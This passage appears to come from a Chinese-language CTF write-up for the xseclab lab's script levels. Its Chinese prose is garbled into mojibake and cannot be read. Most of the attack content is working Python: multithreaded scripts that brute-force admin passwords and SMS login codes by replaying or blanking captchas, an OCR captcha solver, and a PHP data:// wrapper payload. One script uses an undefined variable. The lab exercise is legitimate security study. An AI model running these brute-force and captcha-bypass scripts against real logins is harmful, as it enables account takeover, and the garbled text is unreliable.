æœ€åæ²¡æœ‰å¯¹sessionè¿›è¡Œæ¸…ç©º,é‚£ä¹ˆç”¨æˆ·å¯ä»¥ä¸è¿”å›ä½ çš„è¡¨å•é¡µé¢è€Œæ˜¯ç›´æ¥å†æ¬¡è¯·æ±‚,è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¤šæ¬¡å°è¯•éªŒè¯ç çš„è¯†åˆ«.</p><h5 id="ç¬¬äº”å…³é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ">ç¬¬äº”å…³:é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ</h5><p>é€—æ¯”çš„éªŒè¯ç ï¼Œæœ‰æ²¡æœ‰éš¾é“ä¸ä¸€æ ·å—ï¼Ÿ <a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php">é€šå…³åœ°å€</a> ç¬¬ä¸€é“é¢˜å°±æ˜¯éªŒè¯ç å¯ä»¥é‡å¤æäº¤,é‚£ä¹ˆéªŒè¯ç å°±ç›¸å½“äºæ²¡æœ‰è®¾ç½®,ä½ åªéœ€è¦ä¸€ç›´å¾€éªŒè¯é¡µé¢postç¬¬ä¸€æ¬¡æ­£ç¡®çš„éªŒè¯ç å°±å¯ä»¥.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&#x27;</span>,data=data)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+<span class="number">1000</span>*each,<span class="number">2000</span>+<span class="number">1000</span>*each)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="ç¬¬å…­å…³é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ">ç¬¬å…­å…³:é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ</h5><p>éªŒè¯ä¾¿å¤±æ•ˆçš„éªŒè¯ç  <a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php">é€šå…³åœ°å€</a> è¿™é‡ŒéªŒè¯äº†ä¸€æ¬¡ä¹‹åä¼šéªŒè¯ç ä¼šå¤±æ•ˆ,æ‰€ä»¥ç¬¬ä¸€æ¬¡æ­£ç¡®è¾“å…¥,ä¹‹åæŠŠéªŒè¯ç æ”¹ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:<span class="number">1000</span>,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&#x27;</span>,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+each*<span class="number">1000</span>,<span class="number">2000</span>+each*<span class="number">1000</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="ç¬¬ä¸ƒå…³é€—æ¯”éªŒè¯ç ç¬¬ä¸‰æœŸ">ç¬¬ä¸ƒå…³:é€—æ¯”éªŒè¯ç ç¬¬ä¸‰æœŸ</h5><p>å°¼ç›ï¼ŒéªŒè¯ç æ€ä¹ˆå¯ä»¥è¿™æ ·é€—æ¯”ã€‚ã€‚ éªŒè¯ç åšæˆè¿™æ ·ï¼Œä½ å®¶é‡ŒäººçŸ¥é“å—ï¼Ÿ <a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php">é€šå…³åœ°å€</a> è¿™é‡Œä»–è¯´æœ‰sessionçš„éªŒè¯,ä½†ç”±äºæˆ‘ç¬¬äºŒä¸ªè„šæœ¬å°±å·²ç»ç”¨åˆ°äº†session,æ‰€ä»¥ç¬¬äºŒä¸ªè„šæœ¬éšæ„æ”¹ä¸€ä¸‹å°±å¯ä»¥getç¬¬ä¸‰ä¸ªçš„flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:<span class="number">1000</span>,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php&#x27;</span>,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+each*<span class="number">1000</span>,<span class="number">2000</span>+each*<span class="number">1000</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="ç¬¬å…«å…³å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³äº†">ç¬¬å…«å…³:å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³äº†</h5><p>å°¼ç›ï¼Œç¢°åˆ°è¿™æ ·çš„é¢˜æˆ‘èƒ½ç¬‘å¾—å‡ºæ¥å˜›... <a href="http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php">é€šå…³åœ°å€</a> æºç å®¡è®¡çš„é¢˜,çœ‹æºä»£ç ä¹‹åå‘ç°å‡ ä¸ªç‚¹,ç¬¬ä¸€ä¸ªgetè¯·æ±‚çš„é”®ä¸º^<em>^ä½†æ˜¯åœ¨æ­£åˆ™åˆ¤æ–­é‡Œé¢åˆä¸å…è®¸é”®é‡Œé¢å­˜åœ¨</em> è¿™é‡Œç”¨åˆ°äº†phpçš„ä¸€ä¸ªç‰¹æ€§(å­¦ä¹ åˆ°äº†....),phpé‡Œé¢çš„é”®åŒ…å«<strong>[]</strong>ä»¥åŠ<strong>.</strong>çš„æ—¶å€™ä¼šè¢«æ”¹å†™æˆ_,æ‰€ä»¥æˆ‘ä»¬keyçš„å€¼å†™<sup>.</sup>å°±å¥½äº†,ç„¶åfileæ–¹é¢æˆ‘ç¬¬ä¸€ä¸ªæƒ³åˆ°äº†php://input,ä½†æ˜¯è¿™é‡Œæˆ‘(â—'â—¡'â—)è€æ˜¯æä¸å‡ºæ¥.....åæ¥å»ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹,æœ‰åŒå­¦è¯´ç”¨urlè§£ç ä¸€ä¸‹,ç„¶åå­¦ä¹ äº†ä¸€ä¸ªæ–°è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib, sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> urllib.quote(<span class="string">&quot;(â—&#x27;â—¡&#x27;â—)&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå¾—åˆ°äº†(â—'â—¡'â—)çš„urlencodeå€¼,ç„¶åpostå‘è¿‡å»å°±å¥½äº† å½“ç„¶,å¦å¤–ä¸€ç§æ€è·¯æ˜¯ç”¨dataåè®®....(ä»¥å‰éƒ½æ²¡å¬è¿‡...) payload:http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?<sup>.</sup>=data://text/plain;charset=unicode,(â—'â—¡'â—) ç„¶åå°±æåˆ°flagäº†</p><h5 id="ç¬¬ä¹å…³é€—æ¯”çš„æ‰‹æœºéªŒè¯ç ">ç¬¬ä¹å…³:é€—æ¯”çš„æ‰‹æœºéªŒè¯ç </h5><p>ä½ çš„æ‰‹æœºå·ç æ˜¯13388886666ï¼ŒéªŒè¯ç å°†ä¼šä»¥å¼¹çª—çš„å½¢å¼ç»™å‡º <a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/#">é€šå…³åœ°å€</a> ä¸çŸ¥é“è¿™é“é¢˜å‡ºçš„ä»€ä¹ˆé¬¼,åæ­£å¾ˆç®€å•,ç›´æ¥è·å–éªŒè¯ç ç„¶åæ”¹æ‰‹æœºå·ç ç™»å½•å°±okäº†,ç›®æµ‹åˆæ˜¯éªŒè¯ç å’Œsessionå¯¹åº”äº†,ç„¶åå›è¯ä¸æ”¹å˜ä½†æ˜¯æ‰‹æœºæ”¹å˜è¾¾åˆ°äº†ç›®çš„</p><h5 id="ç¬¬åå…³åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ">ç¬¬åå…³:åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ</h5><p>Tips:ä½ æ˜¯ä¸€åé»‘å®¢ï¼Œä½ æ€€ç–‘ä½ çš„â€œï¼ˆç”·/å¥³ï¼‰é—ºèœœâ€çš„å‡ºè½¨äº†ï¼Œä½ è¦ç™»é™†TAæ‰‹æœºçš„ç½‘ä¸Šè¥ä¸šå…æŸ¥çœ‹è¯¦å•ï¼Œä¸€æ¢ç©¶ç«Ÿï¼ é—ºèœœæ‰‹æœºå·ç :13388886666 <a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/">é€šå…³åœ°å€</a> æ¯”è¾ƒç®€å•,éªŒè¯ç æš´ç ´å°±okäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=6ebf3a78c82d6727a9fe117956aaa083&#x27;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="string">&#x27;13388886666&#x27;</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/vcode.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13388886666</span>,</span><br><span class="line"><span class="string">&#x27;vcode&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(each*<span class="number">100</span>+<span class="number">100</span>,each*<span class="number">100</span>+<span class="number">200</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›å¤:ä½ ä¼¤å¿ƒçš„å‘ç°ä»–/å¥¹æ­£åœ¨è·Ÿä½ çš„å‰ç”·/å¥³å‹å‹¾æ­.....äºæ˜¯ä¸‹å†³å¿ƒçœ‹çœ‹å‰ä»»é™¤äº†è·Ÿä½ çš„ï¼ˆç”·/å¥³ï¼‰é—ºèœœå‹¾æ­ï¼Œæ˜¯ä¸æ˜¯è¿˜è·Ÿåˆ«çš„å‹¾æ­..<br />å‰ä»»çš„æ‰‹æœºå·ç æ˜¯:13399999999 æ‰€ä»¥å†æš´ç ´ä¸€æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=6ebf3a78c82d6727a9fe117956aaa083&#x27;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="number">13399999999</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/vcode.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13399999999</span>,</span><br><span class="line"><span class="string">&#x27;vcode&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(each*<span class="number">100</span>+<span class="number">100</span>,each*<span class="number">100</span>+<span class="number">200</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ç¬¬åä¸€å…³éªŒè¯ç è¯†åˆ«">ç¬¬åä¸€å…³:éªŒè¯ç è¯†åˆ«</h5><p>Tips:éªŒè¯ç ä¾ç„¶æ˜¯3ä½æ•° <a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php">é€šå…³åœ°å€</a> è¿™é‡ŒåŠ å…¥äº†éªŒè¯ç æ¥é˜»ç¢æš´ç ´,æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨pytesseractåº“æ¥å¸®æˆ‘ä»¬è¯†åˆ« ä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php&#x27;</span>,headers=headers)</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="number">13388886666</span>&#125;</span><br><span class="line">u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php&#x27;</span>,headers=headers,data=data)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    img=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#x27;</span>,headers=headers).content</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img)</span><br><span class="line">    vcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    error_time=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> vcode==<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> error_time&lt;<span class="number">3</span>:</span><br><span class="line">        vcode=pytesseract.image_to_string(Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>))</span><br><span class="line">        vcode=vcode.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> error_time&gt;=<span class="number">3</span>:</span><br><span class="line">            img=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#x27;</span>,headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img)</span><br><span class="line">            vcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            error_time=<span class="number">0</span></span><br><span class="line">        error_time+=<span class="number">1</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13388886666</span>,</span><br><span class="line"><span class="string">&#x27;mobi_code&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;user_code&#x27;</span>:vcode,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">    r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>ç„¶ååé¢çš„xssä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸å¼€....è„šæœ¬å…³å°±åˆ°è¿™é‡Œäº†,éªŒè¯ç 